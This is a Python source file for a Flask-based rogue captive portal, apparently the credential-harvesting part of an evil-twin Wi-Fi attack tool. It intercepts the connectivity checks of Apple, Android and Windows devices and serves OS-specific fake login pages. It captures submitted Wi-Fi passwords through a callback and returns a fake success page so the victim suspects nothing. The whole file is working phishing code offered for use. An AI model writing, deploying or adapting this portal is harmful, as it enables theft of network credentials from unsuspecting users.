import os
import threading
from flask import Flask, request, render_template, redirect, Response
from typing import Optional, Callable


CAPTIVE_CHECK_URLS = {
    "apple": ["/hotspot-detect.html", "/library/test/success.html"],
    "android": ["/generate_204", "/gen_204"],
    "windows": ["/connecttest.txt", "/ncsi.txt", "/redirect"],
    "generic": ["/"],
}

OS_UA_PATTERNS = {
    "ios": ["iPhone", "iPad", "iPod", "CaptiveNetworkSupport", "wispr"],
    "android": ["Android", "CaptivePortal"],
    "windows": ["Microsoft NCSI", "Windows", "MSIE", "Trident"],
}


def detect_os(user_agent: str) -> str:
    ua = user_agent or ""
    for os_name, patterns in OS_UA_PATTERNS.items():
        if any(p in ua for p in patterns):
            return os_name
    return "android"


class CaptivePortal:
    def __init__(self, host: str = "10.0.0.1", port: int = 80,
                 template_dir: Optional[str] = None,
                 on_credential: Optional[Callable[[str], None]] = None):
        self.host = host
        self.port = port
        self.on_credential = on_credential
        self.captured: Optional[str] = None
        self._server_thread: Optional[threading.Thread] = None
        self._app = self._build_app(template_dir)

    def _build_app(self, template_dir: Optional[str]) -> Flask:
        base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        tdir = template_dir or os.path.join(base, "templates")
        app = Flask(__name__, template_folder=tdir)
        app.secret_key = os.urandom(16)

        @app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
        @app.route("/<path:path>", methods=["GET", "POST"])
        def catch_all(path):
            ua = request.headers.get("User-Agent", "")
            os_type = detect_os(ua)

            # Handle credential submission
            if request.method == "POST":
                password = (
                    request.form.get("password")
                    or request.form.get("wifi_password")
                    or request.form.get("passwd")
                    or ""
                )
                if password:
                    self.captured = password
                    if self.on_credential:
                        self.on_credential(password)
                    # Return fake success page
                    return render_template(f"{os_type}/success.html"), 200

            # Trigger captive portal detection on OS checks
            for urls in CAPTIVE_CHECK_URLS.values():
                if f"/{path}" in urls or path == "":
                    return render_template(f"{os_type}/index.html"), 200

            return render_template(f"{os_type}/index.html"), 200

        @app.route("/success")
        def success():
            ua = request.headers.get("User-Agent", "")
            os_type = detect_os(ua)
            return render_template(f"{os_type}/success.html"), 200

        return app

    def start(self) -> None:
        self._server_thread = threading.Thread(
            target=self._run, daemon=True
        )
        self._server_thread.start()

    def stop(self) -> None:
        # Flask dev server doesn't have a clean shutdown in threads;
        # the daemon thread exits with the main process.
        pass

    def _run(self) -> None:
        import logging
        log = logging.getLogger("werkzeug")
        log.setLevel(logging.ERROR)
        self._app.run(host=self.host, port=self.port, threaded=True, use_reloader=False)
